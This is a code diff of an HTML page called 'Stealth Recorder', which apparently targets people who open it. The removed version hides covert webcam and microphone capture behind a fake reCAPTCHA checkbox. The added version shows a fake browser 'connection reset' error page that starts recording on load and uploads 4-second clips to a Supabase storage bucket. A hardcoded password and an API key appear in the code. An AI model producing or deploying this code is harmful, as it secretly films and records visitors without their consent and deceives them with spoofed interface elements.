@@ -1,222 +1,98 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <title>Stealth Recorder + Last 4 Videos</title>
+  <title>Stealth Recorder</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script src="https://unpkg.com/@supabase/supabase-js@2.39.5/dist/umd/supabase.js"></script>
   <style>
     body {
       margin: 0;
-      background: white;
-      height: 100vh;
-      width: 100vw;
-      overflow: hidden;
+      background: #121212;
+      color: white;
       font-family: sans-serif;
+    }
+    .fake-error {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
       text-align: center;
     }
-    #lockIcon {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      font-size: 30px;
-      z-index: 999;
-      cursor: pointer;
-      user-select: none;
+    .fake-error img {
+      width: 48px;
+      margin-bottom: 10px;
     }
-    #viewer {
-      display: none;
-      background: black;
-      color: white;
-      height: 100vh;
-      padding: 20px;
-      overflow-y: auto;
+    .fake-error p {
+      margin: 5px 0;
     }
-    video {
-      width: 90%;
-      max-width: 600px;
-      background: #000;
-      margin-top: 10px;
-    }
-    button {
-      padding: 10px 20px;
-      background: red;
+    .fake-error button {
+      margin-top: 20px;
+      background: #3a3a3a;
       color: white;
       border: none;
-      font-size: 16px;
-      cursor: pointer;
-      margin: 20px;
-    }
-    .captcha-container {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      border: 1px solid #ccc;
-      background: white;
-      padding: 25px 30px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    .captcha-box {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 10px;
-      cursor: pointer;
-    }
-    .check {
-      width: 20px;
-      height: 20px;
-      border: 2px solid #999;
-      position: relative;
-    }
-    .check.checked::after {
-      content: '✔';
-      position: absolute;
-      top: -4px;
-      left: 1px;
-      font-size: 18px;
-      color: green;
-      font-weight: bold;
-    }
-    .label-text {
-      font-size: 16px;
-    }
-    .recaptcha-info {
-      font-size: 12px;
-      color: #888;
-      text-align: left;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-size: 14px;
     }
   </style>
 </head>
-<body><div class="captcha-container" onclick="verifyHuman()" id="verifyBox">
-  <div class="captcha-box">
-    <div id="box" class="check"></div>
-    <div class="label-text">I'm not a robot</div>
-    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="40">
+<body onload="startRecording()">
+  <div class="fake-error">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAQAAADZc7J/AAAAvElEQVR4Ae3UMQ6CQBAF0CuRFSg2mhLRe6wCVWg0+k3gJDFZiDddZCRQXuQwPfwduZHmjS//bRPYp4EF4QP7r9GByDYlQzXSnStUozZiyBCyqQCyiU6+lKkeGcA7AUJj7iQlEkLNvPCn4G94ZcQExuAqkV0Up9TCKWWdA0lkak+URAKmaN7mJkr9v9P5YefWg2TzvFQpNKFCok3swGVmXM2nU+TZRAAAAAElFTkSuQmCC" />
+    <p>This site can’t be reached</p>
+    <p style="opacity: 0.7;">The connection was reset.<br>Try: Checking the connection</p>
+    <p style="font-size: 12px; opacity: 0.6;">ERR_CONNECTION_RESET</p>
+    <button>Reload</button>
   </div>
-  <div class="recaptcha-info">
-    reCAPTCHA – <a href="#">Privacy</a> - <a href="#">Terms</a>
-  </div>
-</div><div id="lockIcon" onclick="unlock()" style="display: none;">🔒</div>
-<div id="viewer">
-  <h3>Recording Playback</h3>
-  <video id="playback" controls></video>
-  <br>
-  <button onclick="stopRecording()">STOP</button>
-  <h3>Last 4 Recordings</h3>
-  <div id="videoList"></div>
-</div><script>
-  const PASSWORD = "sardarhamza";
-  const BUCKET = "recordings";
-  const client = supabase.createClient(
-    'https://kelbfujbyjtdeopkhhxm.supabase.co',
-    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtlbGJmdWpieWp0ZGVvcGtoaHhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcyMzc5OTgsImV4cCI6MjA2MjgxMzk5OH0.iB97MRNwVCrhtDQaHrh7Q7ra1x4nVNGhih-Tm_pq31k'
-  );
 
-  let stream, mediaRecorder;
-  let recordedChunks = [];
-  let recordingStarted = false;
-  let stopped = false;
-  let abortRecording = false;
+  <script>
+    const BUCKET = "recordings";
+    const client = supabase.createClient(
+      'https://kelbfujbyjtdeopkhhxm.supabase.co',
+      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtlbGJmdWpieWp0ZGVvcGtoaHhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcyMzc5OTgsImV4cCI6MjA2MjgxMzk5OH0.iB97MRNwVCrhtDQaHrh7Q7ra1x4nVNGhih-Tm_pq31k'
+    );
 
-  function verifyHuman() {
-    document.getElementById("box").classList.add("checked");
-    document.getElementById("verifyBox").style.display = "none";
-    document.getElementById("lockIcon").style.display = "block";
-    startRecording();
-  }
+    let recordedChunks = [];
 
-  async function startRecording() {
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      mediaRecorder = new MediaRecorder(stream);
-      recordedChunks = [];
+    async function startRecording() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
 
-      mediaRecorder.ondataavailable = e => {
-        if (e.data.size > 0) recordedChunks.push(e.data);
-      };
+        mediaRecorder.ondataavailable = e => {
+          if (e.data.size > 0) recordedChunks.push(e.data);
+        };
 
-      mediaRecorder.onstop = async () => {
-        if (abortRecording) return;
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          const fileName = `video_${Date.now()}.webm`;
 
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        document.getElementById("playback").src = url;
+          // Delete old if more than 4
+          const { data: existing } = await client.storage.from(BUCKET).list('', {
+            sortBy: { column: 'name', order: 'asc' }
+          });
 
-        const fileName = `video_${Date.now()}.webm`;
+          const videosOnly = existing?.filter(f => f.name.endsWith('.webm')) || [];
+          if (videosOnly.length >= 4) {
+            const oldest = videosOnly[0];
+            await client.storage.from(BUCKET).remove([oldest.name]);
+          }
 
-        const { data: existing } = await client.storage.from(BUCKET).list('', {
-          sortBy: { column: 'name', order: 'asc' }
-        });
+          await client.storage.from(BUCKET).upload(fileName, blob);
+        };
 
-        const videosOnly = existing.filter(f => f.name.endsWith('.webm'));
-        if (videosOnly.length >= 4) {
-          const oldest = videosOnly[0];
-          await client.storage.from(BUCKET).remove([oldest.name]);
-        }
+        mediaRecorder.start();
 
-        const { error } = await client.storage.from(BUCKET).upload(fileName, blob);
-        if (!error) {
-          await new Promise(resolve => setTimeout(resolve, 1000));
-          loadVideos();
-        }
-      };
-
-      mediaRecorder.start();
-      recordingStarted = true;
-      console.log("Recording started");
-
-      setTimeout(() => {
-        if (!stopped) stopRecording();
-      }, 4000);
-    } catch (err) {
-      alert("Camera Error: " + err.message);
-    }
-  }
-
-  function stopRecording() {
-    if (mediaRecorder && mediaRecorder.state === "recording") {
-      mediaRecorder.stop();
-      stream.getTracks().forEach(t => t.stop());
-      stopped = true;
-    }
-  }
-
-  async function unlock() {
-    const input = prompt("Enter password:");
-    if (input !== PASSWORD) return alert("Wrong password!");
-    abortRecording = true;
-    stopped = true;
-    if (stream) stream.getTracks().forEach(t => t.stop());
-    recordedChunks = [];
-    document.getElementById("viewer").style.display = "block";
-    loadVideos();
-  }
-
-  async function loadVideos() {
-    const { data, error } = await client.storage.from(BUCKET).list('', {
-      sortBy: { column: 'name', order: 'desc' }
-    });
-
-    const container = document.getElementById("videoList");
-    container.innerHTML = "";
-
-    const filtered = (data || [])
-      .filter(f => f.name.endsWith('.webm'))
-      .sort((a, b) => b.name.localeCompare(a.name))
-      .slice(0, 4);
-
-    for (let file of filtered) {
-      const { data: signed } = await client
-        .storage.from(BUCKET)
-        .createSignedUrl(file.name, 60 * 60);
-
-      if (signed?.signedUrl) {
-        const vid = document.createElement("video");
-        vid.src = signed.signedUrl;
-        vid.controls = true;
-        vid.style.marginTop = "15px";
-        container.appendChild(vid);
+        setTimeout(() => {
+          mediaRecorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }, 4000); // 4 second recording
+      } catch (err) {
+        console.error("Camera error:", err.message);
       }
     }
-  }
-</script></body>
+  </script>
+</body>
 </html>
